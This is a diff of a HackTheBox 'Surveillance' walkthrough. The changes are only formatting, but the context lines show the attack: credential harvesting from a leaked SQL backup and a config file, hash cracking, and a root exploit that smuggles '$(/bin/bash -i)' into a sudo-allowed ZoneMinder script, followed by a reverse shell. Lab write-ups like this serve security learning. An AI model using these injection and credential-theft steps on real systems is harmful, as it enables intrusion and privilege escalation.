@@ -1,7 +1,7 @@
 ---
 
 categories: [HackTheBox]
-tags: [ Public_Exploit, Port_Forwording, PrivEsc, Password_Cracking]
+tags: [ Public Exploit, Port Forwarding, PrivEsc, Password Cracking]
 img_path: /assets/images/
 image:
   alt: Linux Medium Level Machine 🧭
@@ -28,6 +28,7 @@ PORT      STATE    SERVICE    VERSION
 56302/tcp filtered unknown
 
 ```
+{: .nolineno}
 ## Web Enumeration ⤵️
 
 Upon checking port 80 and being redirected to `surveillance.htb`, I set the hosts file and loaded the site:
@@ -69,6 +70,7 @@ web.config
 
 > 
 ```
+{: .nolineno}
 
 An `sql` file was found at `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip`, containing sensitive data, including password hashes.
 
@@ -101,6 +103,7 @@ shell.php
 surveillance--2023-10-17-202801--v4.4.14.sql.zip
 web.config
 ```
+{: .nolineno}
 I got this sql data from this file that contains the password hash of matthew ⏬ 
 ```sql
 
@@ -116,6 +119,7 @@ INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','
 UNLOCK TABLES;
 commit;
 ```
+{: .nolineno}
 Using the site [hashes.com](https://hashes.com/en/decrypt/hash) to crack the password hash revealed: `starcraft122490`.🔻
 ![Image](Pasted%20image%2020240217215356.png)
 
@@ -171,6 +175,7 @@ drwx------ 2 matthew matthew 4096 Sep 19 11:26 .cache
 -rw-r----- 1 root    matthew   33 Feb 18 16:32 user.txt
 matthew@surveillance:~$ 
 ```
+{: .nolineno}
 
 After successfully logging in, I identified additional users, including `zoneminder`, and obtained credentials from `/usr/share/zoneminder/www/api/app/Config/database.php`. 🔽 
 
@@ -184,6 +189,7 @@ matthew@surveillance:~$ find / -group zoneminder -type f 2>/dev/null
 /usr/share/zoneminder/www/api/lib/Cake/Config/config.php
 /usr/share/zoneminder/www/api/app/Config/database.php
 ```
+{: .nolineno}
 I looked into this `database.php` file and got some credentials ->
 ```php
 matthew@surveillance:~$ cat /usr/share/zoneminder/www/api/app/Config/database.php
@@ -231,6 +237,7 @@ class DATABASE_CONFIG {
 }
 matthew@surveillance:~$
 ```
+{: .nolineno}
 Now I need to search for `zoneminder` running version ->
 ![Image](Pasted%20image%2020240218220925.png)
 _zoneminder has Version 1.36.32_
@@ -251,6 +258,7 @@ User zoneminder may run the following commands on surveillance:
     (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
 zoneminder@surveillance:/usr/share/zoneminder/www$ 
 ```
+{: .nolineno}
 I find the same files and I got these ->
 ```bash
 zoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin/zm[a-zA-Z]*.pl
@@ -275,10 +283,12 @@ zoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin/zm[a-zA-Z]*.pl
 /usr/bin/zmx10.pl
 zoneminder@surveillance:/usr/share/zoneminder/www$ 
 ```
+{: .nolineno}
 I used this `zmupdate.pl` command to execute the shell command like this ->
 ```bash
 sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
 ```
+{: .nolineno}
 Now lets see the result ➡️
 ```bash
 zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
@@ -302,6 +312,7 @@ whoami
 root@surveillance:~# id
 id
 ```
+{: .nolineno}
 As you can see the shell is not working properly so I redirected to port 4444 as a reverse shell and now it is working file ->
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/HTB/Surveillance/CVE-2023-26035]
@@ -334,5 +345,6 @@ cat: root.tx: No such file or directory
 8022945623be5ae2e721aca14e22693e
 # 
 ```
+{: .nolineno}
 I am root now !!
 
